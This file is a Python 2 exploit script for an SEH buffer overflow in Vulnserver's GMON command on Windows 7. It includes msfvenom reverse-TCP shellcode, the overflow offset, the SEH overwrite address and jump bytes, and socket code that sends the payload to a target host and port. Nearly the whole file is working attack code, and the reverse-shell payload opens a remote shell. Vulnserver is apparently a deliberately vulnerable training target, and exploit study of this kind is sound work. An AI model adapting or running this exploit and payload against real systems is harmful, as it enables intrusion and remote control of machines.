#!/usr/bin/env python2

# Exploit Title: Vulnserver SEH OVerflow for GMON command (no DEP, no ASLR)
# Date: 02/17/2023
# Exploit Author: NG
# Tested on: Windows 7 Professional Service Pack 1 x86
# CVE : N/A




import socket
import sys
import logging

# shellcode: we only have 1000 bytes
# msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=5555 exitfunc=thread -f python  -b '\x00\x0a\x0d' -v shellcode
shellcode =  b""
shellcode += b"\xba\x19\xb8\x66\x91\xda\xcc\xd9\x74\x24\xf4"
shellcode += b"\x5e\x31\xc9\xb1\x52\x83\xee\xfc\x31\x56\x0e"
shellcode += b"\x03\x4f\xb6\x84\x64\x93\x2e\xca\x87\x6b\xaf"
shellcode += b"\xab\x0e\x8e\x9e\xeb\x75\xdb\xb1\xdb\xfe\x89"
shellcode += b"\x3d\x97\x53\x39\xb5\xd5\x7b\x4e\x7e\x53\x5a"
shellcode += b"\x61\x7f\xc8\x9e\xe0\x03\x13\xf3\xc2\x3a\xdc"
shellcode += b"\x06\x03\x7a\x01\xea\x51\xd3\x4d\x59\x45\x50"
shellcode += b"\x1b\x62\xee\x2a\x8d\xe2\x13\xfa\xac\xc3\x82"
shellcode += b"\x70\xf7\xc3\x25\x54\x83\x4d\x3d\xb9\xae\x04"
shellcode += b"\xb6\x09\x44\x97\x1e\x40\xa5\x34\x5f\x6c\x54"
shellcode += b"\x44\x98\x4b\x87\x33\xd0\xaf\x3a\x44\x27\xcd"
shellcode += b"\xe0\xc1\xb3\x75\x62\x71\x1f\x87\xa7\xe4\xd4"
shellcode += b"\x8b\x0c\x62\xb2\x8f\x93\xa7\xc9\xb4\x18\x46"
shellcode += b"\x1d\x3d\x5a\x6d\xb9\x65\x38\x0c\x98\xc3\xef"
shellcode += b"\x31\xfa\xab\x50\x94\x71\x41\x84\xa5\xd8\x0e"
shellcode += b"\x69\x84\xe2\xce\xe5\x9f\x91\xfc\xaa\x0b\x3d"
shellcode += b"\x4d\x22\x92\xba\xb2\x19\x62\x54\x4d\xa2\x93"
shellcode += b"\x7d\x8a\xf6\xc3\x15\x3b\x77\x88\xe5\xc4\xa2"
shellcode += b"\x1f\xb5\x6a\x1d\xe0\x65\xcb\xcd\x88\x6f\xc4"
shellcode += b"\x32\xa8\x90\x0e\x5b\x43\x6b\xd9\x1b\x94\x73"
shellcode += b"\x18\x8c\x96\x73\x0f\xff\x1e\x95\x45\xef\x76"
shellcode += b"\x0e\xf2\x96\xd2\xc4\x63\x56\xc9\xa1\xa4\xdc"
shellcode += b"\xfe\x56\x6a\x15\x8a\x44\x1b\xd5\xc1\x36\x8a"
shellcode += b"\xea\xff\x5e\x50\x78\x64\x9e\x1f\x61\x33\xc9"
shellcode += b"\x48\x57\x4a\x9f\x64\xce\xe4\xbd\x74\x96\xcf"
shellcode += b"\x05\xa3\x6b\xd1\x84\x26\xd7\xf5\x96\xfe\xd8"
shellcode += b"\xb1\xc2\xae\x8e\x6f\xbc\x08\x79\xde\x16\xc3"
shellcode += b"\xd6\x88\xfe\x92\x14\x0b\x78\x9b\x70\xfd\x64"
shellcode += b"\x2a\x2d\xb8\x9b\x83\xb9\x4c\xe4\xf9\x59\xb2"
shellcode += b"\x3f\xba\x7a\x51\x95\xb7\x12\xcc\x7c\x7a\x7f"
shellcode += b"\xef\xab\xb9\x86\x6c\x59\x42\x7d\x6c\x28\x47"
shellcode += b"\x39\x2a\xc1\x35\x52\xdf\xe5\xea\x53\xca"


offset=3515

# with GMON there's no space enough after the SEH to place the shellcode
# We have to place it before and jump back
# Payload:
# GMON [ NOPs shellcode NOPs ][ JMP +8][SEH][NOP][JMP -20xx bytes]
#        <-   3515 bytes     ->    |---------------->   |        
#             <-----------------------------------------
 

buf  = "GMON /.:/"
buf += "\x90"*100				# Some NOPs ahead of the shellcode
buf += shellcode				
buf += "\x90" * (offset - len(shellcode) - 100)	# Filling up to the overflow
buf += "\xeb\x08\x90\x90"			# jump ahed (standard SEH exploitation)
buf += "\xef\x11\x50\x62"			# seh 0x625011ef 
buf += "\x90"*6					# some NOP
buf += "\xe9\x40\xF2\xFF\xFF"			# Jump back before the shellcode
buf += "A"*1000					# trigger the SEH excpetion
buf += '\r\n'

if len(sys.argv) != 3:
    logging.error("usage: " + sys.argv[0] + " ip port")
    sys.exit(-1)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((sys.argv[1], int(sys.argv[2])))
except socket.error as msg:
    logging.error("couldn't connect with target (%s)" % msg)
    sys.exit(1)

# Receives the hello message
rec_data= s.recv(1024)
print rec_data

s.send(buf)

rec_data= s.recv(1024)
print rec_data

